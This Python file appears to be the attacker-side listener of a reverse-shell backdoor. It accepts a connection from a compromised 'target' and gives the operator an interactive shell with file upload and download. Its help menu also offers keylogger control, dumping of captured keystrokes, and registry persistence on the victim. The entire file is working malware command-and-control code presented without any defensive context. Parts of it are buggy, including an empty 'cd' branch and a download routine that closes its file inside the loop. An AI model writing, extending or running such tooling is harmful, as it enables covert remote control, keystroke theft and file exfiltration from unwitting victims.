import socket
import termcolor
import json
import os

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
        target.settimeout(None)
        f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def target_communication():
    while True:
        command = input('* Shell~%s: '% str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Quit session with the target
            clear                               --> Clears the screen
            cd *Directory name*                 --> Changed directory on target system
            upload *file name*                  --> Upload file to target machine
            Download *file name*                --> Download file from target machine
            keylog_start                        --> Start th keylogger
            keylog_dump                         --> Print keystrokes that target inputted
            keylog_stop                         --> Stop and self destruct keylogger file
            persistence *Regname* *filename*    --> Create persistence in registry'''), 'green')
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.2.111', 5555))
print(termcolor.colored('[+] Listening for the incoming connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[+] Target connected from: ' + str(ip), 'green'))
target_communication()